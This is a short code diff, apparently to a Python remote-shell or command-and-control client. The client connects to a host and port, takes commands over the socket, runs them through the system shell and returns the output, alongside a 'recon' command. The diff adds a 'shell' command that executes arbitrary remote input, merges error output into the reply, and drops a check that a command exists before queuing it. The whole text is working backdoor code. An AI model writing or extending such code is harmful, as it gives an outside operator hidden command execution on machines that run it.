@@ -49,6 +49,8 @@ def ctrl_shell_client(host, port):
             socksend(s, ctrl_shell_exec(inp))
         elif inp == 'recon':
             socksend(s, ctrl_shell_recon())
+        elif inp.startswith('shell '):
+            socksend(s, cmd_exec(inp[6:]).strip())
     s.close()
 
 
@@ -69,7 +71,8 @@ def ctrl_shell_recon():
 
 
 def cmd_exec(cmd):
-    return sp.Popen(cmd, stdout=sp.PIPE, shell=True).communicate()[0]
+    return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
+                    shell=True).communicate()[0]
 
 
 def socksend(s, msg):
@@ -122,9 +125,8 @@ def parse_exec_cmds(inp):
         first = inp.find('"')
         second = inp.find('"', first+1)
         cmd = inp[first+1:second]
+        cmds.append(cmd)
         inp = inp[second+2:]
-        if cmd_exec('which ' + cmd.split()[0]):
-            cmds.append(cmd)
     return cmds
 
 
